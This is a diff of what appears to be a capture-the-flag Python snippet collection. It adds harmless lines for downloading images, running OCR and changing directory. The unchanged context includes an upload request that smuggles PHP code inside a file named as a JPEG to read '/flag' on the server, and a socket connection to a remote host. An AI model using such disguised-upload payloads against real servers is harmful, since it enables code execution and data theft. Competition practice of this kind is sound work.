@@ -243,6 +243,10 @@ print(reqpost.content)
 files = {'uploaded': ('123.jpg', "<script language=\"php\">echo file_get_contents(\"/flag\");</script>", 'image/jpeg')} #3-tuple ('filename', fileobj, 'content_type')
 res = requests.post(url, files = files)
 
+#urllib
+from urllib.request import urlretrieve
+urlretrieve(url, '%.4d.jpg' % i)
+
 import socket #For windows
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('210.32.4.14', 13373))
@@ -280,6 +284,7 @@ def run(cmd):
   (stdoutdata, stderrdata) = p.communicate()
   return stdoutdata
 
+subprocess.check_output('tesseract 1.jpg 1', shell=True)
 #matrix#################################################################
 from numpy import *
 temp = array(temp)
@@ -341,6 +346,7 @@ shutil.copy(source, target) #copy file
 for i in sys.path:
     print(i)
 print(os.sep, os.path.exists(os.getcwd()), time.strftime('%Y%m%d%H%M%S', time.gmtime(epoch_time)), os.system('echo hello'), sys.stdout.flush())
+os.chdir('/')
 
 threeDayAgo = (datetime.datetime.now() - datetime.timedelta(days = 3))
 
